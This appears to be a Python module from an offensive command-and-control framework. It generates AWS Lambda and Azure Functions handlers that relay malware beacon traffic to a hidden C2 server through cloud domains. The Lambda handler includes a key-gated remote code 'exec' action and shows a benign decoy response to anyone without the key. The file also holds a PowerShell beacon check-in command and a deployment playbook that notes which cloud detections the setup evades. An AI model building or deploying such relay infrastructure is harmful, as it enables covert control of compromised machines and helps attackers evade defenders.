# language: Python 3.11+, file: cf/relay.py
# *cloud relay — Lambda / Azure Functions as a stager hop*
from __future__ import annotations

from typing import Any

from .util import write_text


def _ps_quote(value: str) -> str:
    """PowerShell single-quoted literal: double the quotes, nothing else."""
    return "'" + value.replace("'", "''") + "'"


class CloudRelay:
    """The beacon talks to *.amazonaws.com / *.azurewebsites.net — blocking it
    means breaking a cloud provider. The function relays to the real C2, or
    evaluates a bounded snippet in-process."""

    @staticmethod
    def aws_lambda_handler() -> str:
        return r"""# AWS Lambda — python3.11, handler: lambda_handler
import base64, hashlib, hmac, json, os, time, urllib.request, ssl
from collections import deque
from urllib.parse import urlsplit

C2_REAL = os.environ.get("C2_REAL", "")
BEACON_KEY = os.environ.get("BEACON_KEY", "")
MAX_CODE = 4096

# the relay only forwards to a public host: a beacon asking for the
# instance metadata endpoint or an RFC1918 address is an SSRF pivot into
# whatever the function role can reach
_BLOCKED_HOSTS = {"metadata.google.internal", "metadata.goog"}


def _blocked(url):
    try:
        import ipaddress
        host = urlsplit(url).hostname
    except (ValueError, ipaddress.AddressValueError):
        return True
    if not host:
        return True
    if host.lower() in _BLOCKED_HOSTS or host.lower().endswith((".internal", ".local", ".lan")):
        return True
    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        return False
    return (ip.is_private or ip.is_link_local or ip.is_loopback
            or ip.is_reserved or ip.is_multicast or ip.is_unspecified)


_RELAY_HEADERS = {"user-agent", "accept", "accept-language", "x-cf-kind"}

# exec budget per cooperating key-hash: 10 runs / 60s window, counted in
# the container's warm memory — restarts reset it, that is accepted slack
_BUCKETS = {}


def _bucket_ok(key_hash, cap=10, per=60.0):
    now = time.time()
    dq = _BUCKETS.setdefault(key_hash, deque())
    while dq and now - dq[0] > per:
        dq.popleft()
    if len(dq) >= cap:
        return False
    dq.append(now)
    return True


def _benign():
    return {"statusCode": 200,
            "body": json.dumps({"status": "ok", "ts": int(time.time())})}


def _authed(req):
    got = req.get("key", "")
    if not BEACON_KEY or not isinstance(got, str):
        return False
    return hmac.compare_digest(
        hashlib.sha256(got.encode()).hexdigest(),
        hashlib.sha256(BEACON_KEY.encode()).hexdigest(),
    )


def _key_hash(req):
    got = req.get("key", "")
    return hashlib.sha256(str(got).encode()).hexdigest()[:16]


def lambda_handler(event, context):
    body = event.get("body", "")
    if event.get("isBase64Encoded"):
        body = base64.b64decode(body).decode("utf-8", "replace")
    try:
        req = json.loads(body) if body else {}
    except Exception:
        req = {}

    if not _authed(req):
        return _benign()

    action = req.get("action", "ping")
    if action == "ping":
        return {"statusCode": 200,
                "body": json.dumps({"status": "ok", "msg": "alive",
                                    "ts": int(time.time())})}
    if action == "exec":
        code = req.get("code", "")
        if not isinstance(code, str) or len(code.encode()) > MAX_CODE:
            return {"statusCode": 413,
                    "body": json.dumps({"error": "code too large"})}
        if not _bucket_ok(_key_hash(req)):
            return {"statusCode": 429,
                    "body": json.dumps({"error": "exec rate limited"})}
        # one signed trace per exec: what ran and how big, never the code
        print(json.dumps({
            "event": "relay_exec",
            "key": _key_hash(req),
            "sha256": hashlib.sha256(code.encode()).hexdigest(),
            "size": len(code.encode()),
        }))
        buf = {}
        try:
            exec(compile(code, "<cmd>", "exec"), {"__builtins__": __builtins__}, buf)
            out = buf.get("out", "")
        except Exception as e:
            out = f"error: {e}"
        return {"statusCode": 200,
                "body": json.dumps({"status": "ok", "out": out})}
    if action == "relay":
        url = req.get("url") or C2_REAL
        if not str(url).startswith(("http://", "https://")):
            return {"statusCode": 400, "body": json.dumps({"error": "bad url"})}
        if _blocked(str(url)):
            return {"statusCode": 403, "body": json.dumps({"error": "blocked host"})}
        raw_headers = req.get("headers", {}) if isinstance(req.get("headers"), dict) else {}
        headers = {str(k): str(v) for k, v in raw_headers.items()
                   if str(k).lower() in _RELAY_HEADERS}
        try:
            r = urllib.request.urlopen(
                urllib.request.Request(url, headers=headers, method="GET"),
                timeout=15, context=ssl.create_default_context())
            return {"statusCode": 200,
                    "body": json.dumps({"status": r.status,
                                        "body": r.read().decode("utf-8", "replace")[:4000]})}
        except Exception as e:
            return {"statusCode": 502, "body": json.dumps({"error": str(e)})}
    return {"statusCode": 400, "body": json.dumps({"error": "unknown action"})}
"""

    @staticmethod
    def azure_function_handler() -> str:
        return r"""# Azure Functions — python3.11, HTTP trigger (function_app.py)
import azure.functions as func
import hashlib, hmac, ipaddress, json, os, ssl, time, urllib.request
from urllib.parse import urlsplit

app = func.FunctionApp(http_auth_level=func.AuthLevel.ANONYMOUS)
BEACON_KEY = os.environ.get("BEACON_KEY", "")
C2_REAL = os.environ.get("C2_REAL", "")

_BLOCKED_HOSTS = {"metadata.google.internal", "metadata.goog"}


def _blocked(url):
    try:
        host = urlsplit(url).hostname
    except ValueError:
        return True
    if not host:
        return True
    if host.lower() in _BLOCKED_HOSTS or host.lower().endswith((".internal", ".local", ".lan")):
        return True
    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        return False
    return (ip.is_private or ip.is_link_local or ip.is_loopback
            or ip.is_reserved or ip.is_multicast or ip.is_unspecified)


_RELAY_HEADERS = {"user-agent", "accept", "accept-language", "x-cf-kind"}


def _authed(req_json):
    got = req_json.get("key", "")
    if not BEACON_KEY or not isinstance(got, str):
        return False
    return hmac.compare_digest(
        hashlib.sha256(got.encode()).hexdigest(),
        hashlib.sha256(BEACON_KEY.encode()).hexdigest(),
    )


def _json(payload, status=200):
    return func.HttpResponse(json.dumps(payload), mimetype="application/json",
                             status_code=status)


@app.route(route="api/v1/status", methods=["GET", "POST"])
def status(req: func.HttpRequest) -> func.HttpResponse:
    body = req.get_body()
    req_json = {}
    if body:
        try:
            req_json = json.loads(body)
        except Exception:
            req_json = {}
    if not _authed(req_json):
        return _json({"status": "ok", "ts": int(time.time())})

    action = req_json.get("action", "ping")
    if action == "ping":
        return _json({"status": "ok", "msg": "alive"})
    if action == "relay":
        url = req_json.get("url") or C2_REAL
        if not str(url).startswith(("http://", "https://")):
            return _json({"error": "bad url"}, 400)
        if _blocked(str(url)):
            return _json({"error": "blocked host"}, 403)
        raw_headers = req_json.get("headers", {}) if isinstance(req_json.get("headers"), dict) else {}
        headers = {str(k): str(v) for k, v in raw_headers.items()
                   if str(k).lower() in _RELAY_HEADERS}
        try:
            r = urllib.request.urlopen(
                urllib.request.Request(url, headers=headers, method="GET"),
                timeout=15, context=ssl.create_default_context())
            return _json({"status": r.status,
                          "body": r.read().decode("utf-8", "replace")[:4000]})
        except Exception as e:
            return _json({"error": str(e)}, 502)
    return _json({"error": "unknown"}, 400)
"""

    @staticmethod
    def beacon_client(c2_url: str, key: str) -> str:
        """Stager-side check-in. Key is quoted, not interpolated raw."""
        return (
            f"$k={_ps_quote(key)};$u={_ps_quote(c2_url)};"
            "$b=@{key=$k;action='ping'}|ConvertTo-Json -Compress;"
            "$r=Invoke-RestMethod -Uri $u -Method POST -Body $b "
            "-ContentType 'application/json';$r.status"
        )

    @staticmethod
    def write_handlers(directory: str = ".") -> dict[str, str]:
        lambda_path = write_text(
            f"{directory}/aws_lambda_fn.py", CloudRelay.aws_lambda_handler()
        )
        azure_path = write_text(
            f"{directory}/function_app.py", CloudRelay.azure_function_handler()
        )
        return {"lambda": str(lambda_path), "azure": str(azure_path)}

    @staticmethod
    def deployment_playbook() -> dict[str, Any]:
        return {
            "aws_lambda": {
                "setup": [
                    (
                        "aws lambda create-function --function-name api-status "
                        "--runtime python3.11 --handler lambda_handler "
                        "--zip-file fileb://fn.zip --role arn:aws:iam::<acct>:role/lambda-role"
                    ),
                    "attach a Function URL (auth NONE) with CORS",
                    "url shape: https://xxx.lambda-url.us-east-1.on.aws/",
                ],
                "env": ["BEACON_KEY", "C2_REAL"],
                "detection": "GuardDuty flags unusual lambda-url only with config on",
            },
            "azure_functions": {
                "setup": [
                    "func azure functionapp publish <app-name>",
                    "keep auth anonymous on the route",
                    "url shape: https://<app>.azurewebsites.net/api/v1/status",
                ],
                "env": ["BEACON_KEY", "C2_REAL"],
                "detection": "Defender for Cloud Apps watches odd azurewebsites hosts",
            },
            "gcp_cloud_functions": {
                "setup": [
                    (
                        "gcloud functions deploy status --runtime python311 "
                        "--trigger-http --allow-unauthenticated --entry-point=status"
                    ),
                    "url shape: https://<region>-<proj>.cloudfunctions.net/status",
                ],
                "detection": "low on a clean project",
            },
        }
